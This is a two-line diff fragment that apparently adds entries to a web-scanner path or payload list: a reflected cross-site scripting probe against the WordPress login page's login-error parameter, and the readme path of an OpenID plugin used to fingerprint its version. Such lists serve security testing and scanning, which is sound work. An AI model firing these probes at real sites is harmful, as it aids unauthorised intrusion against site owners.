@@ -1,0 +1,2 @@
+/wp-login.php?login-error=<script>alert(document.domain)</script>
+/wp-content/plugins/openid/readme.txt
